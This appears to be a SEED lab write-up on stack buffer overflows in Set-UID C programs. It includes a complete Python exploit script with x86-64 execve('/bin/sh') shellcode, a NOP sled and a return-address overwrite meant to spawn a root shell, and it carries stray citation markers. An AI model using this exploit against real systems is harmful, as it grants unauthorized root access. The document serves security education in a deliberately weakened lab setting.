# Buffer Overflow Exploitation & Privilege Escalation

## Objective
Analyze stack-based buffer overflow vulnerabilities in Set-UID C executables and develop Python exploit scripts (`exploit-L1.py`, `exploit-L2.py`, `exploit-L3.py`, and `exploit-L4.py`) to overwrite saved frame pointers, redirect execution flow to custom x86 and x64 shellcode payloads, and spawn elevated root shells (`euid = 0`).

---

## Environment Configuration
* **OS Environment:** SEED Ubuntu Linux VM
* **Compiler Flags:** `gcc -z execstack -fno-stack-protector` (Stack execution enabled, stack canaries disabled)
* **Kernel Configuration:** ASLR disabled via `sysctl` (`/proc/sys/kernel/randomize_va_space = 0`)

---

## Execution & Exploitation Strategies

### 1. 32-Bit Brute Spray Exploitation (`exploit-L1.py` & `exploit-L2.py`)
* **Architecture:** 32-bit x86 architecture using 4-byte pointer addresses (`L = 4`) and 27-byte x86 shellcode.
* **Technique:** Placed the shellcode at the very end of the 517-byte buffer array (`517 - len(shellcode)`), leaving a wide NOP sled (`0x90`)[cite: 8, 9]. To bypass exact return address calculation, sprayed the first 200 bytes of the buffer with repeated target return addresses calculated using NOP sled offsets (`ret = 0xffffcaec + 400`)[cite: 8, 9].

### 2. 64-Bit Precise Offset Exploitation (`exploit-L3.py` & `exploit-L4.py`)
* **Architecture:** 64-bit x86-64 architecture using 8-byte pointer addresses (`L = 8`) and 27-byte x64 syscall shellcode (`\x0f\x05`).
* **Technique:** Targeted specific frame offsets (`offset = 216` for Level 3, `offset = 18` for Level 4) to overwrite saved frame return addresses precisely, calculating entry points into the NOP sled using base register pointers (`0x7fffffffd976`) plus offset padding[cite: 6, 7].

---

## Code Snippet (64-Bit Targeted Exploit - `exploit-L3.py`)

```python
#!/usr/bin/python3
import sys

# 27-byte x86-64 shellcode executing execve("/bin/sh")
shellcode = (
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

# Initialize 517-byte buffer with NOP sled (0x90)
content = bytearray(0x90 for i in range(517)) 

# Place shellcode at the end of the buffer payload
start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Calculate target return address pointing into NOP region
ret = 0x7fffffffd976 + 1600     
offset = 216              
L = 8     # 8-byte address size for 64-bit architecture

# Overwrite target return address at specific stack offset
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little') 

with open('badfile', 'wb') as f:
    f.write(content)
